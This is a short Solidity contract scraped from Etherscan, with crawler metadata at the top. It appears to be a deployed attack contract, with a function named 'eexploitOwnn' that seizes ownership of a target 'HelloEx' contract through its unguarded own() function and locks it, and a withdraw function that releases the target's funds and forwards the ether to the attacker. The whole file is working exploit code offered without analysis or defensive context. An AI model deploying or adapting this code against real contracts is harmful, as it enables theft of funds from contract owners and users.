//token_name	
//token_url	https://etherscan.io//address/0x0531c928d539cbee3aa3bb3dae37ad507c750efc#code
//spider_time	2018/07/08 11:18:06
//token_Transactions	9 txns
//token_price	

pragma solidity ^0.4.24;
contract HelloEx{

	function own(address owner) {}

	function releaseFunds(uint amount) {}

	function lock() {}
}

contract Call{

	address owner;

	HelloEx contr;

	constructor() public
	{
		owner = msg.sender;
	}

	function setMyContractt(address addr) public
	{
		require(owner==msg.sender);
		contr = HelloEx(addr);
	}

	function eexploitOwnn() payable public
	{
		require(owner==msg.sender);
		contr.own(address(this));
		contr.lock();
	}

	function wwwithdrawww(uint amount) public
	{
		require(owner==msg.sender);
		contr.releaseFunds(amount);
		msg.sender.transfer(amount * (1 ether));
	}

	function () payable public
	{}
}